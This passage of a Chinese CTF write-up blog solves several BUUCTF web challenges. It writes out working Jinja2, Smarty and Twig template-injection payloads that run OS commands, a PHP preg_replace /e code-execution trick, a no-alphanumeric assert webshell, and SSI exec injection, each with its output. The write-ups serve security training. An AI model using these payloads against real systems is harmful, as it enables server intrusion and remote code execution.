这个75是用脚本跑出来的，跑的方法是检测那个数字是否有globals，但是buu这里加了jwt，好像是不能跑了，所以就用这个吧，查询能用的内建函数：
```
{{''.__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__}}
```
发现里面有`eval`和`open`，我们直接使用eval，这里因为有过滤所以我们要绕过一下：
```
{{''.__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__['ev'+'al']("__imp"+"ort__('o"+"s').po"+"pen('ls /').read()")}}
```
发现文件：
```
app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var 
```
读取：
```
{{''.__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__['open']('/this_is_the_fl'+'ag.txt').read()}}
```
得到flag，还有的做法[参考](http://15h3na0.xyz/2020/02/24/ICQ%20GYCTF2020/#%E6%96%B9%E6%B3%951-SSTI%E6%BC%8F%E6%B4%9E)，用到了ssti[任意代码执行的poc](https://github.com/vulhub/vulhub/tree/master/flask/ssti)：
```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

----
## [BJDCTF2020]The mystery of ip
打开后进入Flag，然后发现了我的ip，改了下xff，果然可以，不过看起来好像有点奇怪，试了下ssti，模板注入：
```
{{system("ls")}}
```
成功执行：
```
css
flag.php
header.php
hint.php
img
index.php
jquery
libs
templates_c
templates_c
```
读取flag：
```
{{system("cat /flag")}}
```
get flag

----
## [BJDCTF2020]ZJCTF，不过如此
打开能看见源码：
```
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
可以看到首先是要来一个text，并且文件内容要是特定字符串，`file_get_contents`可以读取php伪协议的内容，所以我们：
```
get:    text=php://input
post:   I have a dream
```
绕过第一层，第二个是一个正则匹配，防止我们读取flag，我们先读取next.php：
```
get:    file=php://filter/read=convert.base64-encode/resource=next.php
```
得到源码：
```
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```
在本地用php7调试的时候发现`preg_replace`的/e被弃用了，建议我换另一个函数，一般来说，php函数被替换都是安全问题，所以我们搜索`preg_replace /e`果然找到了代码执行漏洞，详见[资料](https://mochazz.github.io/2018/08/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day8%20-%20preg_replace%E5%87%BD%E6%95%B0%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#Day8-Candle)，那个`\\1`就是用来读取正则匹配到的第一个结果：
```
get:    \Q*=${getFlag()}&cmd=system('cat /flag');
```
并且发现了[PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs)，php相关漏洞总结。

----
## [BJDCTF2020]Cookie is so stable
似乎又是一道模板注入，现在得祭出一张神图：
```flow
st=>start: 开始测试

cond1=>condition: ${7*7}
cond2=>condition: a{*comment*}b
cond3=>condition: ${"z".join("ab")}
cond4=>condition: {{7*7}}
cond5=>condition: {{7*'7'}

e1=>end: Smarty
e2=>end: Mako
e3=>end: Unknown
e4=>end: Jinjia2/Twig
e5=>end: Unknown
e6=>end: Not Vulnerable

st->cond1
cond1(yes,right)->cond2
cond2(yes)->e1
cond2(no)->cond3
cond3(yes)->e2
cond3(no)->e3
cond1(no)->cond4
cond4(yes)->cond5
cond4(no)->e6
cond5(yes)->e4
cond5(no)->e5
```
经过测试，这是一个[Twig的模板注入](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig)，在题目中得到提示是在cookie中注入：
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```
得到flag

----
## [GWCTF 2019]枯燥的抽奖
打开后发现一个`check.php`：
```
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php"); 
```
看到了随机数种子似乎是可控的，找到[文章](https://www.freebuf.com/vuls/192012.html)，首先我们还原随机数：
```
str1 = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2 = 'n8pevnXWA3'
str3 = str1[::-1]
length = len(str2)
res = ''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' '
            break

print(res)
```
使用`php_mt_seed`跑，几经波折得到种子：
```
747509726
```
使用源码生成，得到key，提交后拿到flag。

----
## [极客大挑战 2019]RCE ME
打开就是源码：
```
<?php
error_reporting(0);
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(strlen($code)>40){
        die("This is too Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

?>
```
看起来又是过滤了所有的字母和数字，又要用到无数字字母shell，使用异或或者取反构造字符串：
```
<?php
$a = "phpinfo";
echo urlencode(~$a);
```
整个phpinfo看看：
```
code=(~%8F%97%8F%96%91%99%90)();
```
发现php版本为7，并且`disable_functions`ban了一大堆函数，我们整一个另外的`_GET`上去绕过长度限制，要注意的是php要执行变量里面的语句的话，需要将变量用大括号括起来：
```
code=${~%A0%B8%BA%AB}[_]();&_=phpinfo
```
整个shell，assert在php7中可以当作函数使用来执行php语句：
```
code=${~%A0%B8%BA%AB}[_](${~%A0%B8%BA%AB}[__]);&_=assert&__=eval($_POST['cmd'])
```
蚁剑连上，发现了`flag`和`readflag`，很显然是需要我们用`readflag`来整到这个文件的，但是能执行系统命令的函数都被ban了，所以没有办法执行，这里官方给的wp是用so文件，我使用的是烨师傅的方法，用蚁剑的插件，里面有一个绕过`disable_functions`，选择php7，直接运行`readflag`，成功读取到flag

----
## [HITCON 2015]Babyfirst
打开就能看见源码：
```
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    echo $dir."\n";
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
sandbox/174.0.222.75
Warning: count(): Parameter must be an array or an object that implements Countable in /var/www/html/index.php on line 11

Warning: implode(): Invalid arguments passed in /var/www/html/index.php on line 15
```
这里的正则要去必须全为字母和数字，空格也不行

----
## [BJDCTF2020]EasySearch
尝试注入，无果，扫目录发现swp文件：
```
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```
可以看到这里要求是md5前六位要想等，我们直接爆破：
```
import hashlib

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-'

for a in chars:
    for b in chars:
        for c in chars:
            for d in chars:
                for e in chars:
                    st = a + b + c + d + e
                    if hashlib.md5(st.encode('ascii')).hexdigest()[:6] == '6d0bc1':
                        print(st)
```
跑出来几个：
```
AQ^X2
AzHnn
A@@Tu
```
登录：
```
admin AzHnn
```
在header中找到：
```
public/5f0d51501509e4840b037f9966c54071aa559884.shtml
```
访问：
```
Hello,admin

data: Friday, 20-Mar-2020 12:59:57 UTC

Client IP: 174.0.222.75
```
shtml可以造成[ssi（服务器端包含）](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)，看起来像是在username处注入，测试：
```
username=<!--#exec cmd="ls ../" -->&password=AzHnn
```
得到目录：
```
flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public 
```
读取：
```
username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" -->&password=AzHnn
```
得到flag

----
## [GXYCTF2019]BabyUpload
